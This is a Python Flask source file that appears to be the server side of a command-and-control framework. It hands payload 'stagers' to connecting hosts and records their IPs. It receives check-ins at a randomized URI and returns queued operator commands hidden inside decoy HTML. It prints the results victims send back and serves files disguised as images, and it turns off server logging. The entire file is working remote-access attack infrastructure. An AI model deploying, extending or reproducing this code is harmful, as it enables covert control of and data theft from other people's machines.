import logging
import os
import urllib.parse as parse

from connect import color, connection, util
from flask import Flask, render_template, request, send_file

app = Flask(__name__)

checkin_uri = f'/{util.generate_id()}'

@app.route('/<format_id>', methods=['GET'])
def serve_stagers(format_id):
    remote_addr = request.remote_addr
    if format_id not in engine.STAGERS.keys():
        return render_template('connection_template.html', random_data=util.random_data)
    color.information(f'{engine.STAGERS[format_id].format} file requested ({remote_addr})')
    connection_id = util.generate_id()
    connection = engine.create_connection(connection_id, engine.STAGERS[format_id])
    connection.system_information['ip'] = remote_addr
    return render_template(
        f'stagers/{engine.connections[connection_id].stager.format}',
        checkin_uri=checkin_uri,
        connection_id=connection_id,
        variables=engine.STAGERS[format_id].variables,
    )

@app.route(f'{checkin_uri}', methods=['POST'])
def checkin():
    post_data = dict(request.get_json(force=True)) #figure it out force=true
    color.verbose(f'{post_data} made to {checkin_uri} ')
    template = render_template('connection_template.html', random_data=util.random_data)
    try:
        connection = engine.retrieve_connection(post_data['connection_id'])
    except:
        return template
    internet_addr = connection.system_information['ip']
    connection.check_in()
    if 'results' in post_data.keys():
        color.normal('\n')
        color.information(f'results recieved ({internet_addr})')
        color.normal(parse.unquote(post_data['results']))
    if 'filename' in post_data.keys():
        filename = post_data['filename']
        return send_file(f'templates/uploads/{filename}', mimetype='image/jpg')
    if 'command_request' in post_data.keys() and connection.command_queue:
        template = render_template('connection_template.html', random_data=util.random_data, command=connection.command_queue.pop(0))
    return template

def run(ip, port):
    os.environ['WERKZEUG_RUN_MAIN'] = 'true'
    log = logging.getLogger('werkzeug')
    log.disabled = True
    app.config['TEMPLATES_AUTO_RELOAD'] = True
    try:
        app.run(host=ip, port=port)
    except:
        color.information(f'Error starting server')
        return
    return
